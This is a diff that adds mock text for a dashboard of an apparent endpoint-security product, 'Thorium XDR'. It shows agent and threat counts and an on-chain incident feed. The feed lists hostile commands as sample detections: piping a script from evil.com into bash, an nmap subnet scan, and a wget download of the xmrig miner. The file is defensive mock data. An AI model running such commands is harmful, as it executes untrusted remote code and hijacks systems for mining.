@@ -1,0 +1,13 @@
+Dashboard Header: 🛡️ Thorium XDR (Sui Testnet Connected - 0xa::edr_registry)
+Security Overview:
+- Active Agents: 24 (↑ 3 this week)
+- Critical Threats: 1 (Require attention)
+- Files Quarantined: 142 (Last 30 days)
+- Total Processed (PTB): 8,932
+🚨 Live Incident Feed (On-Chain):
+1. CRITICAL: curl -s http://evil.com/sh | bash
+   Agent: 0x1a2b...3c4d • Action: KILLED_AND_ISOLATED (Just now)
+2. WARNING: nmap -sV 10.0.0.0/24
+   Agent: 0x4b5c...6a7b • Action: BLOCKED (2 mins ago)
+3. HIGH: wget http://miner.pool/xmrig
+   Agent: 0x9f8e...7d6c • Action: KILLED_AND_ISOLATED (1 hr ago)
